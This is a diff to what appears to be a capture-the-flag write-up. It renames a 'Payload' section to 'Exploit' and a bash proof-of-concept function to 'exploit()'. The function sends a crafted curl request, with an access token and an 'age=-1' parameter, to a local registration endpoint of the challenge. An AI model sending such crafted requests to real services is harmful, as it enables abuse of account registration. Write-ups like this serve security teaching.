@@ -36,14 +36,14 @@ Enjoy! :)
 1. Why can I get the flag sometimes when I am running the code at my local machine?
     - The connection between your golang server and redis is too fast. This is a trap.
 
-#### Payload
+#### Exploit
 
 ```bash
 # Google account name is name1
 TOKEN="access_token"
 HOST="http://localhost:8000/register"
 
-function poc()
+function exploit()
 {
   curl "${HOST}" \
   -H 'accept-language: hu' \
@@ -51,7 +51,7 @@ function poc()
   --data "name=different_from_name1&access_token=${TOKEN}&interest=AH!&age=-1&praise=&prove="
 }
 
-poc
+exploit
 ```
 
 ---
